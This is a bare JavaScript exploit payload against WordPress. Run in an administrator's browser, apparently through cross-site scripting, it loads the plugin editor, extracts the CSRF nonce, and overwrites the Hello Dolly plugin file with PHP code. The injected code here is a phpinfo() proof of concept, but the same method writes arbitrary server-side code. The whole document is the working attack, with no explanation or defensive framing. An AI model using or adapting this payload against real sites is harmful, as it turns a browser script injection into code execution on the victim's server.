url = window.location.href;
url = url.split('wp-admin')[0];
p = 'wp-admin/plugin-editor.php?';
q = 'file=hello.php';
s = '<?php phpinfo();?>';

a = new XMLHttpRequest();
a.open('GET', url+p+q, 0);
a.send();

ss = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
'&newcontent=' + s + '&action=update&file=hello.php';

b = new XMLHttpRequest();
b.open('POST', url+p+q, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send(ss);

